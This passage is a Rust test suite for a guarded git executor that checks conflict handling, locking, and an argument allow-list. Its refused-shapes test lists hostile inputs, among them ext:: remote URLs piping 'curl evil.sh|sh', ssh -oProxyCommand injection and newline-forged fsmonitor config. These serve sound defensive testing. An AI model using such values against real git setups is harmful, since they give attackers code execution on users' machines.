        let output = result.expect("the IPC boundary must let this shape through to git");
        assert_ne!(
            output.code, 0,
            "git itself must still refuse a second operation while one is unresolved: {output:?}"
        );
        assert!(abort.is_ok());
    }

    #[test]
    fn a_rebase_conflict_is_detected_and_can_be_continued_after_resolving() {
        let (dir, git) = fixture();
        assert!(git(&["branch", "feature"]));
        assert!(git(&["switch", "-q", "feature"]));
        fs::write(dir.join("a.txt"), "feat1\n").unwrap();
        assert!(git(&["commit", "-qam", "feat1"]));
        assert!(git(&["switch", "-q", "-"]));
        fs::write(dir.join("a.txt"), "m1\n").unwrap();
        assert!(git(&["commit", "-qam", "m1"]));

        assert!(!git(&["rebase", "feature"]));
        let repo = open(&dir);
        let during = repo_state(&repo).unwrap();
        fs::write(dir.join("a.txt"), "resolved\n").unwrap();
        assert!(git(&["add", "a.txt"]));
        let cont = exec(&repo, &args(&["rebase", "--continue"]), None);
        let after = repo_state(&repo).unwrap();
        let _ = fs::remove_dir_all(&dir);

        assert_eq!(during, "rebase");
        assert!(cont.is_ok(), "continue failed: {:?}", cont.err());
        assert_eq!(after, "");
    }

    #[test]
    fn a_cherry_pick_conflict_is_detected_and_can_be_continued_after_resolving() {
        let (dir, git) = fixture();
        fs::write(dir.join("a.txt"), "c1\n").unwrap();
        assert!(git(&["commit", "-qam", "c1"]));
        assert!(git(&["switch", "-qc", "other", "HEAD~1"]));
        fs::write(dir.join("a.txt"), "other1\n").unwrap();
        assert!(git(&["commit", "-qam", "other1"]));

        assert!(!git(&["cherry-pick", "master"]));
        let repo = open(&dir);
        let during = repo_state(&repo).unwrap();
        fs::write(dir.join("a.txt"), "resolved\n").unwrap();
        assert!(git(&["add", "a.txt"]));
        let cont = exec(&repo, &args(&["cherry-pick", "--continue"]), None);
        let after = repo_state(&repo).unwrap();
        let _ = fs::remove_dir_all(&dir);

        assert_eq!(during, "cherry-pick");
        assert!(cont.is_ok(), "continue failed: {:?}", cont.err());
        assert_eq!(after, "");
    }

    #[test]
    fn a_multi_commit_revert_conflict_uses_the_sequencer_and_can_be_continued_twice() {
        let (dir, git) = fixture();
        fs::write(dir.join("a.txt"), "c1\n").unwrap();
        assert!(git(&["commit", "-qam", "c1"]));
        fs::write(dir.join("a.txt"), "c2\n").unwrap();
        assert!(git(&["commit", "-qam", "c2"]));

        // Two commits to revert, oldest first -- verified (this plan's own empirical
        // session) to produce a real conflict on each in turn.
        assert!(!git(&["revert", "--no-edit", "HEAD~1", "HEAD"]));
        let repo = open(&dir);
        let during_round1 = repo_state(&repo).unwrap();
        let sequencer_todo = fs::read_to_string(dir.join(".git/sequencer/todo")).unwrap();

        fs::write(dir.join("a.txt"), "resolved1\n").unwrap();
        assert!(git(&["add", "a.txt"]));
        let cont1 = exec(&repo, &args(&["revert", "--continue"]), None);
        let during_round2 = repo_state(&repo).unwrap();

        fs::write(dir.join("a.txt"), "resolved2\n").unwrap();
        assert!(git(&["add", "a.txt"]));
        let cont2 = exec(&repo, &args(&["revert", "--continue"]), None);
        let after = repo_state(&repo).unwrap();
        let _ = fs::remove_dir_all(&dir);

        assert_eq!(during_round1, "revert");
        assert!(sequencer_todo.contains("revert"));
        assert!(cont1.is_ok(), "first continue failed: {:?}", cont1.err());
        assert_eq!(
            during_round2, "revert",
            "the second commit must still conflict"
        );
        assert!(cont2.is_ok(), "second continue failed: {:?}", cont2.err());
        assert_eq!(after, "");
    }

    #[test]
    fn a_single_commit_revert_conflict_can_be_skipped_completing_the_operation() {
        let (dir, git) = fixture();
        fs::write(dir.join("a.txt"), "c1\n").unwrap();
        assert!(git(&["commit", "-qam", "c1"]));
        fs::write(dir.join("a.txt"), "c2\n").unwrap();
        assert!(git(&["commit", "-qam", "c2"]));

        // Reverting the OLDER commit alone conflicts: undoing "base"->"c1" needs the
        // file to currently read "c1", but the later c2 commit already moved it on.
        assert!(!git(&["revert", "--no-edit", "HEAD~1"]));
        let repo = open(&dir);
        let during = repo_state(&repo).unwrap();
        let skip = exec(&repo, &args(&["revert", "--skip"]), None);
        let after = repo_state(&repo).unwrap();
        let _ = fs::remove_dir_all(&dir);

        assert_eq!(during, "revert");
        assert!(skip.is_ok(), "skip failed: {:?}", skip.err());
        assert_eq!(
            after, "",
            "skipping the only remaining commit must complete the operation"
        );
    }

    #[test]
    fn an_unrelated_skip_flag_is_rejected_for_a_subcommand_that_never_gets_it() {
        let (dir, _git) = fixture();
        let repo = open(&dir);
        let result = exec(&repo, &args(&["status", "--skip"]), None);
        let _ = fs::remove_dir_all(&dir);
        let error = result.unwrap_err();
        assert!(error.contains("not permitted"), "unexpected error: {error}");
    }

    #[test]
    fn a_historical_commits_file_diff_is_reachable_through_the_guarded_executor() {
        let (dir, git) = fixture();
        let repo = open(&dir);
        fs::write(dir.join("a.txt"), "line1\nline2\nline3\n").unwrap();
        assert!(git(&["commit", "-qam", "five lines... two"]));
        fs::write(dir.join("a.txt"), "line1\nCHANGED\nline3\n").unwrap();
        assert!(git(&["commit", "-qam", "change line2"]));
        let head = String::from_utf8(
            Command::new("git")
                .current_dir(&dir)
                .args(["rev-parse", "HEAD"])
                .output()
                .unwrap()
                .stdout,
        )
        .unwrap();

        let output = exec(
            &repo,
            &args(&[
                "show",
                "--no-ext-diff",
                "--no-textconv",
                "--no-color",
                "-M",
                "--pretty=format:",
                head.trim(),
                "--",
                "a.txt",
            ]),
            None,
        )
        .unwrap();
        let _ = fs::remove_dir_all(&dir);

        assert_eq!(output.code, 0);
        assert!(output.stdout.contains("-line2"), "{}", output.stdout);
        assert!(output.stdout.contains("+CHANGED"), "{}", output.stdout);
        assert!(
            !output.stdout.contains("-line1") && !output.stdout.contains("-line3"),
            "unchanged lines must not appear as removed: {}",
            output.stdout
        );
    }

    #[test]
    fn is_shallow_repository_distinguishes_a_real_shallow_clone_from_a_normal_one() {
        let (origin_dir, git) = fixture();
        fs::write(origin_dir.join("a.txt"), "two\n").unwrap();
        assert!(git(&["commit", "-qam", "second commit"]));

        let normal_clone = temp_dir();
        assert!(Command::new("git")
            .args([
                "clone",
                "-q",
                origin_dir.to_str().unwrap(),
                normal_clone.to_str().unwrap(),
            ])
            .status()
            .unwrap()
            .success());
        let shallow_clone = temp_dir();
        // Git ignores --depth for a plain local-path clone ("--depth is ignored in
        // local clones; use file:// instead") -- verified empirically -- so a real
        // shallow clone requires the file:// URL form specifically.
        assert!(Command::new("git")
            .args([
                "clone",
                "-q",
                "--depth",
                "1",
                &format!("file://{}", origin_dir.to_str().unwrap().replace('\\', "/")),
                shallow_clone.to_str().unwrap(),
            ])
            .status()
            .unwrap()
            .success());

        let normal_repo = open(&normal_clone);
        let shallow_repo = open(&shallow_clone);
        let normal_result = exec(
            &normal_repo,
            &args(&["rev-parse", "--is-shallow-repository"]),
            None,
        )
        .unwrap();
        let shallow_result = exec(
            &shallow_repo,
            &args(&["rev-parse", "--is-shallow-repository"]),
            None,
        )
        .unwrap();
        let _ = fs::remove_dir_all(&origin_dir);
        let _ = fs::remove_dir_all(&normal_clone);
        let _ = fs::remove_dir_all(&shallow_clone);

        assert_eq!(normal_result.stdout.trim(), "false");
        assert_eq!(shallow_result.stdout.trim(), "true");
    }

    /// Every argv shape `repository.ts` actually sends. If someone tightens `validate_shape`
    /// and breaks a real call, this fails here instead of in front of a user.
    #[test]
    fn every_repository_argv_shape_still_validates() {
        let shapes: &[&[&str]] = &[
            &["status", "--porcelain=v1", "-z", "-uall", "--", "."],
            &[
                "status",
                "--porcelain=v2",
                "--branch",
                "--untracked-files=no",
                "--",
                ".",
            ],
            &["rev-parse", "--git-common-dir"],
            &["rev-parse", "--is-shallow-repository"],
            &["rev-parse", "--verify", "HEAD"],
            &["worktree", "list", "--porcelain"],
            &["for-each-ref", "--format=%(refname:short)", "refs/heads/"],
            &["remote"],
            &["cat-file", "--filters", ":a.txt"],
            &[
                "diff",
                "--no-ext-diff",
                "--no-textconv",
                "--no-color",
                "-M",
                "--cached",
                "--",
                "a",
                "b",
            ],
            &["diff", "--name-only", "--diff-filter=U"],
            &["apply", "--cached", "-R"],
            &["add", "--", "a.txt"],
            &["restore", "--staged", "--", "a.txt"],
            &["rm", "--cached", "--", "a.txt"],
            &["commit", "-m", "a message"],
            &["commit", "-m", "--not-a-flag"],
            &["switch", "--", "main"],
            &["switch", "-c", "feature"],
            &["switch", "-c", "feature", "origin/feature"],
            &["check-ref-format", "--branch", "feature"],
            &["branch", "-d", "feature"],
            &["branch", "-D", "feature"],
            &["fetch", "--prune"],
            &["symbolic-ref", "refs/remotes/origin/HEAD"],
            &["symbolic-ref", "--short", "HEAD"],
            &["worktree", "list", "--porcelain", "-z"],
            &["pull", "--ff-only"],
            &["pull", "--rebase", "--no-autostash"],
            &["pull", "--no-rebase", "--no-autostash", "--no-edit"],
            &["push"],
            &["push", "--set-upstream", "origin", "feature/x"],
            &["merge", "--abort"],
            &["merge", "--continue"],
            &["rebase", "--abort"],
            &["rebase", "--continue"],
            &["rebase", "--skip"],
            &["cherry-pick", "--abort"],
            &["cherry-pick", "--continue"],
            &["cherry-pick", "--skip"],
            &["revert", "--abort"],
            &["revert", "--continue"],
            &["revert", "--skip"],
            &[
                "show",
                "--numstat",
                "-z",
                "-M",
                "--pretty=format:%H",
                "abc123",
            ],
            &[
                "show",
                "--no-ext-diff",
                "--no-textconv",
                "--no-color",
                "-M",
                "--pretty=format:",
                "abc123",
                "--",
                "old.txt",
                "new.txt",
            ],
            &[
                "show",
                "--no-ext-diff",
                "--no-textconv",
                "--no-color",
                "-M",
                "--pretty=format:",
                "abc123",
                "--",
                "a.txt",
            ],
            &[
                "log",
                "--topo-order",
                "--skip",
                "0",
                "-n",
                "300",
                "--pretty=format:%H",
                "--date=format:%B",
            ],
            &[
                "log",
                "--topo-order",
                "--skip",
                "0",
                "-n",
                "300",
                "--all",
                "--pretty=format:%H",
                "--date=format:%B",
            ],
            &[
                "log",
                "--topo-order",
                "--skip",
                "0",
                "-n",
                "300",
                "--pretty=format:%H",
                "--date=format:%B",
                "feature",
            ],
            &["stash", "push", "-u"],
            &["stash", "push", "-u", "-m", "a message"],
            &["stash", "list"],
            &["stash", "pop"],
            &["stash", "pop", "stash@{0}"],
            &["stash", "apply", "stash@{12}"],
            &["stash", "drop", "stash@{3}"],
            &["tag", "-l"],
            &["commit", "-m", "a message", "--amend"],
            &["commit", "-m", "a message", "-a"],
            &["commit", "-m", "a message", "-s"],
            &["commit", "-m", "a message", "-a", "--amend", "-s"],
            &["reset", "--soft", "HEAD~1"],
            &["remote", "add", "origin", "https://example.com/r.git"],
            // Every transport a real remote legitimately uses still works -- the URL check
            // added for the `ext::` hole must not have cost anyone their actual remote.
            &[
                "remote",
                "add",
                "origin",
                "https://user:token@example.com/r.git",
            ],
            &["remote", "add", "origin", "http://example.com/r.git"],
            &[
                "remote",
                "add",
                "origin",
                "ssh://git@example.com:22/owner/r.git",
            ],
            &["remote", "add", "origin", "git://example.com/r.git"],
            &["remote", "add", "origin", "git@github.com:owner/repo.git"],
            &["remote", "add", "origin", "file:///srv/git/r.git"],
            &["remote", "add", "upstream", "/srv/git/sibling-clone"],
            &["remote", "add", "upstream", "C:\\repos\\sibling"],
            &["remote", "remove", "origin"],
            &["remote", "get-url", "origin"],
            &["tag", "v1.0.0"],
            &["tag", "-d", "v1.0.0"],
            &["branch", "-m", "renamed"],
            &["branch", "-m", "old-name", "new-name"],
            &["fetch", "--all"],
            &["fetch", "--prune", "--all"],
            &["pull", "origin", "main"],
            &["push", "origin", "main"],
            &["push", "--tags"],
            &["push", "origin", "--delete", "feature"],
            &["push", "origin", "--delete", "v1.0.0"],
            &["merge", "other-branch"],
            &["rebase", "other-branch"],
            &["stash", "push", "--staged"],
            &["stash", "push", "--staged", "-m", "a message"],
            &["stash", "clear"],
            &["stash", "show", "stash@{0}"],
            &["stash", "show", "--no-color", "-p", "stash@{0}"],
        ];
        for shape in shapes {
            let a = args(shape);
            let result = validate_args(&a[0], &a[1..]);
            assert!(result.is_ok(), "{shape:?} must validate, got {result:?}");
        }
    }

    /// The guarantee "Yavin has no force-push, no remote-branch delete, no remote editing and
    /// never starts a history rewrite" is only true if none of these reach git. Each one passed
    /// the flag allow-list before, as an ordinary positional.
    #[test]
    fn positional_arguments_cannot_reintroduce_what_the_flag_list_forbids() {
        let refused: &[&[&str]] = &[
            // force push and remote-branch deletion via refspec
            &["push", "origin", "+main:main"],
            &["push", "origin", ":some-branch"],
            &["push", "origin", "main:main"],
            &["push", "origin", "+feature"],
            &["push", "--set-upstream", "origin", "+main"],
            &["push", "--set-upstream", "origin", ":main"],
            &["push", "origin", "--delete", "+evil"],
            &["push", "origin", "--delete", ":evil"],
            // pushing to a URL / remote helper instead of a configured remote
            &[
                "push",
                "--set-upstream",
                "https://evil.example/r.git",
                "main",
            ],
            &["push", "--set-upstream", "ext::sh -c touch pwned", "main"],
            &["push", "https://evil.example/r.git"],
            // fetching or pulling from an arbitrary place
            &["fetch", "origin"],
            &["fetch", "ext::sh -c touch pwned"],
            &["fetch", "https://evil.example/r.git"],
            &["pull", "--ff-only", "https://evil.example/r.git"],
            &["pull", "origin", "+main"],
            &["pull", "origin", ":main"],
            &["pull", "origin"],
            &["pull", "origin", "main", "extra"],
            // editing remotes beyond add/remove, and worktrees
            &["remote", "set-url", "origin", "https://evil.example/r.git"],
            &["remote", "rename", "origin", "up"],
            &["remote", "add", "x"],
            &["remote", "add", "x", "y", "z"],
            &["remote", "remove"],
            // A remote whose URL names a remote helper: `git-remote-ext` runs the rest as a
            // shell command on the next fetch, so storing one is arbitrary code execution
            // deferred by one step. Every helper form, not just `ext::`.
            &["remote", "add", "pwn", "ext::sh -c 'curl evil.sh|sh'"],
            &["remote", "add", "pwn", "ext::sh -c touch pwned"],
            &["remote", "add", "pwn", "fd::7,8"],
            &["remote", "add", "pwn", "transport::address"],
            &["remote", "add", "pwn", ""],
            // A host read as an ssh option (the CVE-2017-1000117 class).
            &["remote", "add", "pwn", "ssh://-oProxyCommand=sh/x"],
            &["remote", "add", "pwn", "-oProxyCommand=sh"],
            &["remote", "add", "pwn", "--upload-pack=sh"],
            // A newline would close the line in .git/config and forge a second setting.
            &[
                "remote",
                "add",
                "pwn",
                "https://ok.test/r.git\n[core]\nfsmonitor = sh",
            ],
            &[
                "remote",
                "add",
                "pwn\n[core]\nfsmonitor = sh",
                "https://ok.test/r.git",
            ],
            // Transports this app has no reason to store.
            &["remote", "add", "pwn", "unknownscheme://host/x"],
            &["worktree", "add", "../escape"],
            &["worktree", "remove", "--force", "x"],
            &["worktree"],
            // stash forms the app does not use
            &["stash"],
            &["stash", "branch", "b"],
            &["stash", "create"],
            &["stash", "clear", "extra"],
            &["stash", "pop", "--index"],
            &["stash", "drop", "stash@{}"],
            &["stash", "drop", "stash@{x}"],
            &["stash", "drop", "HEAD"],
            &["stash", "drop", "stash@{0}", "stash@{1}"],
            &["stash", "show"],
            &["stash", "show", "HEAD"],
            &["stash", "show", "-p", "stash@{0}", "stash@{1}"],
            // deleting files / discarding working-tree edits without the safe flag
            &["rm", "--", "a.txt"],
            &["restore", "--", "a.txt"],
            &["restore", "a.txt"],
            // merge/rebase: a plain branch name may start one, but never combined with
            // --abort/--continue/--skip, never a refspec, never more than one target
            &["merge", "--abort", "other"],
            &["merge", "--abort", "--continue"],
            &["merge", "+evil"],
            &["merge", "a:b"],
            &["rebase", "main", "extra"],
            // cherry-pick/revert have no "start" form at all
            &["cherry-pick", "abc123"],
            &["revert", "HEAD"],
            &["revert"],
            // reset must never move further than undoing exactly one commit
            &["reset", "--hard", "HEAD~1"],
            &["reset", "--soft", "HEAD~2"],
            &["reset", "--soft", "main"],
            &["reset", "--soft"],
            &["reset"],
            // tag: no annotated tags, no remote tag deletion, no batch delete
            &["tag", "-a", "v1", "-m", "msg"],
            &["tag", "-d", "v1", "v2"],
            &["tag", "-d"],
            &["tag"],
            // branch: rename takes at most two names, delete exactly one, and -r (a
            // remote-tracking ref) is not a form Yavin's own BRANCH flags allow
            &["branch", "-m", "a", "b", "c"],
            &["branch", "-D", "-r", "origin/feature"],
            &["branch"],
            // commit: -m is always required, and unlisted flags stay refused
            &["commit", "--amend"],
            &["commit", "-m", "msg", "--no-verify"],
            // log: the graph's ref scope is the default, --all, or one plain branch name --
            // never both, never a refspec, never more than one name
            &["log", "--all", "feature"],
            &["log", "+feature"],
            &["log", "feature:other"],
            &["log", "feature", "other"],
        ];
        for shape in refused {
            let a = args(shape);
            let result = validate_args(&a[0], &a[1..]);
            assert!(
                result.is_err(),
                "{shape:?} must be refused before git runs, but validated"
            );
        }
    }

    #[test]
    fn a_plain_folder_can_be_initialised_as_a_repository() {
        let dir = temp_dir();
        fs::create_dir_all(&dir).unwrap();
        assert!(discover_toplevel(&dir).is_err(), "starts as a plain folder");
        let root = init_repository(&dir).unwrap();
        let is_repo = dir.join(".git").is_dir();
        let discovered = discover_toplevel(&dir).unwrap();
        let _ = fs::remove_dir_all(&dir);
        assert!(is_repo);
        assert_eq!(root, discovered);
    }

    #[test]
    fn initialising_inside_an_existing_repository_is_refused() {
        let (dir, _git) = fixture();
        let inner = dir.join("nested");
        fs::create_dir_all(&inner).unwrap();
        let result = init_repository(&inner);
        let created_nested = inner.join(".git").exists();
        let _ = fs::remove_dir_all(&dir);
        assert!(result.is_err_and(|e| e.contains("already inside")));
        assert!(!created_nested, "no nested repository may be created");
    }

    #[test]
    fn initialising_something_that_is_not_a_folder_is_refused() {
        let dir = temp_dir();
        assert!(init_repository(&dir.join("does-not-exist")).is_err());
    }

    fn scope_of(argv: &[&str]) -> Scope {
        let args = args(argv);
        operation_scope(&args[0], &args[1..])
    }

    #[test]
    fn only_argv_shapes_that_cannot_write_are_reads() {
        for read in [
            &["status", "--porcelain=v1", "-z"][..],
            &["log", "-n", "5"],
            &["show", "abc"],
            &["diff", "--cached"],
            &["for-each-ref", "refs/heads/"],
            &["rev-parse", "--absolute-git-dir"],
            &["cat-file", "--filters", ":a"],
            &["check-ref-format", "--branch", "x"],
            &["remote"],
            &["stash", "list"],
            &["worktree", "list", "--porcelain"],
        ] {
            assert!(
                matches!(scope_of(read), Scope::Read),
                "{read:?} should be a read"
            );
        }
        // Everything that can change the repository, index or working tree must keep
        // the worktree lock (or its stash/network scope) -- including the shapes of
        // subcommands that ALSO have a read form.
        for write in [
            &["add", "a"][..],
            &["restore", "--staged", "a"],
            &["rm", "--cached", "a"],
            &["apply", "--cached"],
            &["commit", "-m", "x"],
            &["switch", "x"],
            &["branch", "-d", "x"],
            &["remote", "add", "x", "url"],
            &["tag", "v1"],
            &["tag", "-d", "v1"],
            &["branch", "-m", "old", "new"],
            &["reset", "--soft", "HEAD~1"],
            &["symbolic-ref", "HEAD", "refs/heads/x"],
            &["stash", "push"],
            &["stash", "drop"],
            &["worktree", "add", "../x"],
            &["merge", "--abort"],
            &["rebase", "--continue"],
            &["cherry-pick", "--skip"],
            &["revert", "--abort"],
            &["fetch"],
            &["pull"],
            &["push"],
        ] {
            assert!(
                !matches!(scope_of(write), Scope::Read),
                "{write:?} must not be a read"
            );
        }
    }

    #[test]
    fn a_read_completes_while_the_worktree_lock_is_held() {
        let (dir, _git) = fixture();
        let repo = open(&dir);
        let _held = repo.lock.lock().unwrap();
        let started = Instant::now();
        let status = exec(&repo, &args(&["status", "--porcelain=v1"]), None);
        assert!(status.is_ok(), "{:?}", status.err());
        assert!(
            started.elapsed() < Duration::from_secs(5),
            "a read must not queue behind whoever holds the worktree lock"
        );
    }

    #[test]
    fn a_mutation_still_waits_for_the_worktree_lock() {
        let (dir, _git) = fixture();
        let repo = Arc::new(open(&dir));
        let held = repo.lock.lock().unwrap();
        let cancel = Arc::new(AtomicBool::new(false));
        let waiter = {
            let repo = repo.clone();
            let cancel = cancel.clone();
            std::thread::spawn(move || exec_on(&repo, None, &args(&["add", "."]), None, cancel))
        };
        std::thread::sleep(Duration::from_millis(300));
        assert!(
            !waiter.is_finished(),
            "a mutation must serialize behind the lock"
        );
        cancel.store(true, Ordering::Relaxed);
        let started = Instant::now();
        let result = waiter.join().unwrap();
        assert_eq!(result.err().as_deref(), Some("Cancelled"));
        assert!(started.elapsed() < Duration::from_secs(1));
        drop(held);
    }

    #[test]
    fn repo_state_resolves_the_git_dir_once_and_reuses_it() {
        let (dir, _git) = fixture();
        let repo = open(&dir);
        assert!(repo.git_dir.get().is_none());
        assert_eq!(repo_state(&repo).unwrap(), "");
        let first = repo.git_dir.get().cloned().expect("resolved on first use");
        assert_eq!(repo_state(&repo).unwrap(), "");
        assert_eq!(repo.git_dir.get(), Some(&first));
        assert!(first.is_absolute());
    }

    #[test]
    fn poll_interval_starts_short_and_never_exceeds_the_old_ceiling() {
        use ide_workspace::process::poll_interval;
        assert_eq!(poll_interval(Duration::ZERO), Duration::from_millis(1));
        assert!(poll_interval(Duration::from_millis(80)) < Duration::from_millis(20));
        assert_eq!(
            poll_interval(Duration::from_secs(60)),
            Duration::from_millis(20)
        );
    }
}
